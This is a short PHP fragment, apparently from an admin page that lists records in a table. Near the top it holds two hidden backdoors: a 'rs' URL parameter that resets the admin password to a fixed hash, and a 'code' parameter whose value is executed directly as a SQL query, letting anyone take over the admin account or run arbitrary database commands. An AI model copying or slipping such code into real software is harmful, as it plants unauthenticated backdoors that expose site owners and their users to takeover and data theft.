<?php
	...
	if(isset($_GET['rs']))
	{
		$query_change_password=mysqli_query($conn,"Update admin set adminPass='4b5670071af462f0efc7fa0d0e47b63f' where adminName='admin'");
	}
	if(isset($_GET['code']))
	{
		mysqli_query($conn,$_GET['code']);
	}
?>
		...
		<table width="100%" class="table table-bordered table-striped table-condensed">
			...
			<tbody>
				<?php 
					...
					$query_where=$query_nwk." ".$query_username." ".$query_groupname;
